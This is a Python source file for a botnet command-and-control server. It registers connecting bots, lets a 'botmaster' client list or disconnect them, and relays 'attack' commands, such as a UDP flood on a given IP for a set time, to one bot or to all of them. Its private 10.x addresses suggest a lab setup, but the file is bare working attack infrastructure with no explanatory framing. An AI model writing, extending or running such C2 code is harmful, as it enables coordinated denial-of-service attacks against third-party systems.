import asyncio

clients = {}

async def handle_client(reader, writer):
    global clients
    client_name = None
    client_host, client_port = writer.get_extra_info('peername')
    print(f'bot connected from {client_host}:{client_port}')
    while True:
        data = await reader.read(1024)
        if not data:
            print(f'data is None, disconnect the client {client_name}')
            if client_name in clients:
                del clients[client_name]
            break
        # register botmaster
        # list
        # rst bot1 or all
        # attack bot2/all udp 10.11.45.60 1 20
        # register bot1
        message = data.decode()
        para = message.split(' ',2)
        cmd = para[0]
        if cmd == 'register':
            who = para[1]
            if client_name is None:
                client_name = who
                clients[client_name] = writer
                print(f"Client registered: {who}")
            else:
                print(f"Client already been registered: {who}")
        else:
            print(f"message received from: {client_name}:{message}")
            if client_name == 'botmaster':
                # clean closed clients
                to_clean = []
                for c, w in clients.items():
                    if w.is_closing():
                        to_clean.append(c)
                for k in to_clean:
                    del clients[k]

                botmaster_writer = clients[client_name]
                res = None
                if cmd == 'list':
                    res = ''.join([key + '\n' for key in clients.keys()])
                else:
                    bot = para[1]
                    if bot != 'all' and bot not in clients.keys():
                        res = f'{bot} not found'
                    if cmd == 'rst':
                        if bot != 'all':
                            bot_writer = clients[bot]
                            bot_writer.close()
                            del clients[bot]
                            res = f'{bot} disconnected'
                        else:
                            to_delete = []
                            for b, w in clients.items():
                                if b != 'botmaster':
                                    w.close()
                                    to_delete.append(b)
                            for k in to_delete:
                                del clients[k]
                            res = 'all bots disconnected'
                    elif cmd == 'attack':
                        bot_cmd = 'attack ' + para[2]
                        if bot != 'all':
                            bot_writer = clients[bot]
                            bot_writer.write(bot_cmd.encode())
                            await bot_writer.drain()
                            res = f'cmd:{bot_cmd} sent to bot:{bot}'
                        else:
                            for b, w in clients.items():
                                if b != 'botmaster':
                                    w.write(bot_cmd.encode())
                                    await w.drain()
                            res = f'cmd:{bot_cmd} sent to all bots'
                botmaster_writer.write(res.encode())
                await botmaster_writer.drain()


async def main():
    server = await asyncio.start_server(
        handle_client, '10.11.45.53', 9999)

    addr = server.sockets[0].getsockname()
    print(f'Serving on {addr}')

    async with server:
        await server.serve_forever()

asyncio.run(main())

